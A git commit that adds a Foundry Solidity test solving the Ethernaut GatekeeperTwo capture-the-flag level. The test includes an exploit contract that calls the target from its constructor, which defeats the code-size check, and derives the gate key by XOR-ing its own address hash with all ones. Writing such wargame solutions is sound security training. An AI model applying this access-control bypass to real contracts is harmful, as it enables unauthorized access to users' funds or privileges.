f54eb93952f27532de8db987a5e1aab1c71c15e6
voith <voithjm1@gmail.com>
2023-01-19 15:41:23 +0530

    added GateKeeperTwo CTF

---
+++ test/GateKeeperTwo.t.sol
@@ -0,0 +1,31 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import "../ethernaut/GatekeeperTwo.sol";
+
+
+contract ExploitGateKeeperTwo {
+    constructor(address gateKeeperTwo) {
+        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(0xffffffffffffffff);
+        GatekeeperTwo(gateKeeperTwo).enter(gateKey);
+    }
+}
+
+contract TestGateKeeperTwo is Test {
+    GatekeeperTwo gateKeeperTwo;
+    address attacker = address(0x51);
+
+    function setUp() external {
+        gateKeeperTwo = new GatekeeperTwo();
+    }
+
+    function testExploit() external {
+        vm.prank(attacker, attacker);
+        assertEq(gateKeeperTwo.entrant(), address(0));
+        new ExploitGateKeeperTwo(address(gateKeeperTwo));
+        assertEq(gateKeeperTwo.entrant(), attacker);
+    }
+
+}
